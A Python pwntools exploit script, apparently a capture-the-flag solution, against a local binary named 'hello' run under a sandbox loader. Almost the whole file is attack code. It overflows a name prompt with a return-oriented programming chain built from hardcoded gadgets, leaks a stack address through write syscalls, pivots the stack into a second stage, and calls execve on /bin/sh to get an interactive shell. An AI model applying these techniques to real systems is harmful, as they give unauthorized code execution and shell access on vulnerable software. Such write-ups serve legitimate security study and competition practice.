#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")
exe = ELF("hello")
# context.log_level='debug'
# p = remote("addr", 1337)
p = process(["./loadere","hello"])
context.terminal = ["foot"]
def gdbs():
    # gdb.attach(p, gdbscript="""
    #
    #            """)
    p = gdb.debug(["./loadere","hello"],"""

                    """)
    return p

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
# p = gdbs()
offset = 7820912
# p = gdb.debug(exe.path)
pop_rax = 0x0000000000401001
pop_rdi = 0x00000000040013af
pop_rsi = 0x00000000040013ad # pop rsi; pop r15; ret
pop_rdx = 0x00000000040023b3
pop_rbp = 0x0000000004000113
ret = 0x0000000000401002
leave_ret = 0x0000000004000185
syscall = 0x4002e5f
rw_sec = 0x4005260
rbp = 0x4004e58
gad = p64(pop_rdi) + p64(rw_sec)
gad += p64(exe.sym.puts)
gad2 = p64(pop_rdi) + p64(rw_sec)
gad2 += p64(exe.sym.puts)

# payload = p64(pop_rdi) + p64(0x4004038)
# payload += p64(exe.sym.puts)
#
# payload += p64(pop_rax) + p64(0)
# payload += p64(pop_rdi) + p64(0)
# payload += p64(pop_rsi) + p64(rw_sec)+p64(rw_sec)
# payload += p64(pop_rdx) + p64(0x600)
# payload += p64(syscall)
# payload += p64(leave_ret)
# sla("r your name:",b"a"*(264-8)+p64(rw_sec-8)+payload)
payload = b""
# payload += p64(ret)
# payload += p64(exe.sym.puts)*(4+7)
# payload += p64(pop_rdi) + p64(offset+8)
# payload += p64(pop_rax) + p64(1024)
# payload += p64(syscall)
payload += gad*(0x34-0x20)

payload += p64(pop_rax) + p64(0)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(rw_sec)+p64(rw_sec)
payload += p64(pop_rdx) + p64(0x500)
payload += p64(syscall)
# leak address from sandbox
payload += p64(pop_rax) + p64(1)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(rw_sec+8)+p64(rw_sec+8)
payload += p64(pop_rdx) + p64(0x80)
payload += p64(syscall)

payload += p64(exe.sym.puts)*(0x1d)
# get opcode and put that to the destination
payload += p64(pop_rdi) + p64(offset)
payload += p64(pop_rax) + p64(1024)
payload += p64(syscall)


# read data to the final address
payload += p64(pop_rax) + p64(0)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(rw_sec)+p64(rw_sec)
payload += p64(pop_rdx) + p64(0x500)
payload += p64(syscall)
payload += p64(pop_rbp) + p64(rw_sec-8)
payload += p64(leave_ret)
# execve

# input("all payload -> ")
sla("your name:",b"a"*(264-8)+p64(rw_sec)+payload)
inputs = "".ljust(10+5,"a")
input("leak address ->")
sl(inputs)
p.recvuntil("*buf='aaaaaaa")
# p.recvuntil(inputs)
p.recvline()
addr = u64(p.recvuntil("',",drop=True).ljust(8,b"\0"))
stack = addr
# heap = addr - 0x522f0
# iovec = heap +0x127b0
log.info(f"{hex(stack) = }")
flag_addr = stack-96
log.info(f"{hex(flag_addr) = }")
# # log.info(f"{hex(iovec) = }")
payload = b""
payload += p64(pop_rax) + p64(0)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(rw_sec+0x300)+p64(rw_sec)
payload += p64(pop_rdx) + p64(0x500)
payload += p64(syscall)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(pop_rdi) + p64(flag_addr)
payload += p64(pop_rsi) + p64(0) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)
input("execve->")
sl(payload)
input("/bin/sh-> ")
sl("/bin/sh\0")

#










p.interactive()
# good luck pwning :)

